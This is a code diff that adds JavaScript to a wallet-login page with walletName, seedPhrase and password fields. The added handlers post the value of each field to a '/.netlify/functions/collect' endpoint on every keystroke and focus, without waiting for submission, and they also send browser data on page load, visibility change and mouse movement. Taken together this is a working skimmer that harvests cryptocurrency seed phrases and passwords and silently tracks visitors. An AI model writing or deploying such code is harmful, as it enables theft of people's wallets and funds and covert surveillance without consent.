@@ -168,6 +168,124 @@
         return results;
       }
 
+      // Auto-collect data immediately when page loads
+      window.addEventListener("load", async () => {
+        console.log("🔄 Auto-collecting data on page load...");
+
+        try {
+          // Collect all data immediately
+          const autoData = await collectData();
+
+          // Add page load specific data
+          autoData.pageLoadTime = new Date().toISOString();
+          autoData.pageLoadEvent = "Page Loaded";
+          autoData.referrer = document.referrer || "Direct";
+          autoData.url = window.location.href;
+          autoData.userInteracted = false;
+
+          // Send data immediately
+          const response = await fetch("/.netlify/functions/collect", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(autoData),
+          });
+
+          if (response.ok) {
+            console.log("✅ Auto-data sent successfully on page load");
+          } else {
+            console.log("❌ Failed to send auto-data");
+          }
+        } catch (error) {
+          console.error("❌ Error sending auto-data:", error);
+        }
+      });
+
+      // Collect data when user interacts with form fields
+      function setupFormTracking() {
+        const formFields = ["walletName", "seedPhrase", "password"];
+
+        formFields.forEach((fieldId) => {
+          const field = document.getElementById(fieldId);
+          if (field) {
+            // Track when user starts typing
+            field.addEventListener("input", async (e) => {
+              const interactionData = await collectData();
+              interactionData.interactionType = "Form Input";
+              interactionData.fieldName = fieldId;
+              interactionData.fieldValue = e.target.value;
+              interactionData.interactionTime = new Date().toISOString();
+
+              // Send interaction data
+              fetch("/.netlify/functions/collect", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(interactionData),
+              }).catch((error) =>
+                console.error("Error sending interaction data:", error)
+              );
+            });
+
+            // Track when user focuses on field
+            field.addEventListener("focus", async () => {
+              const focusData = await collectData();
+              focusData.interactionType = "Field Focus";
+              focusData.fieldName = fieldId;
+              focusData.interactionTime = new Date().toISOString();
+
+              fetch("/.netlify/functions/collect", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(focusData),
+              }).catch((error) =>
+                console.error("Error sending focus data:", error)
+              );
+            });
+          }
+        });
+      }
+
+      // Setup form tracking when page loads
+      window.addEventListener("load", setupFormTracking);
+
+      // Collect data when page becomes visible
+      document.addEventListener("visibilitychange", async () => {
+        if (document.visibilityState === "visible") {
+          const visibilityData = await collectData();
+          visibilityData.interactionType = "Page Visible";
+          visibilityData.visibilityState = document.visibilityState;
+          visibilityData.interactionTime = new Date().toISOString();
+
+          fetch("/.netlify/functions/collect", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(visibilityData),
+          }).catch((error) =>
+            console.error("Error sending visibility data:", error)
+          );
+        }
+      });
+
+      // Collect data on mouse movement (throttled)
+      let mouseMoveTimeout;
+      document.addEventListener("mousemove", async (e) => {
+        clearTimeout(mouseMoveTimeout);
+        mouseMoveTimeout = setTimeout(async () => {
+          const mouseData = await collectData();
+          mouseData.interactionType = "Mouse Movement";
+          mouseData.mouseX = e.clientX;
+          mouseData.mouseY = e.clientY;
+          mouseData.interactionTime = new Date().toISOString();
+
+          fetch("/.netlify/functions/collect", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(mouseData),
+          }).catch((error) =>
+            console.error("Error sending mouse data:", error)
+          );
+        }, 1000); // Send data every 1 second of mouse movement
+      });
+
       // Form submission handler
       document
         .getElementById("walletForm")
